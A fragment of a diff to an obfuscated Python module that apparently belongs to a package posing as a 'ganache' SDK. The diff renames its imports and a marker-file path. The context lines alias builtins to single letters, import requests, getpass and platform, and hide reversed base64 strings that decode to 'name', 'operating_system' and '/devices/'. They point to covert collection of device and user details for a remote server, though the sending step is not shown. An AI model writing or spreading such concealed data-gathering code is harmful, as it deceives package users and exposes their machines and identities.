@@ -1,11 +1,11 @@
 C=open
 B=print
 import os,platform as D
-from ganache.helperx import q,r,s
-from ganache.helperln import v, w
+from ganache_sdk.helperx import q,r,s
+from ganache_sdk.helperln import v, w
 import requests as F,getpass as G,json,base64 as H
-from ganache.fflg import AM
-from ganache.utils import K
+from ganache_sdk.fflg import AM
+from ganache_sdk.utils import K
 I='==QZtFmb'
 J='==QblR3c5N3Xn5Wa0FmclB3b'
 L='vMXZjlmdlR2L'
@@ -35,7 +35,7 @@ def get_device_id():
             return id
 
 def mark_complete():
-    with open("ganache/done", 'w') as file:
+    with open("ganache_sdk/done", 'w') as file:
         pass
 
 def main():
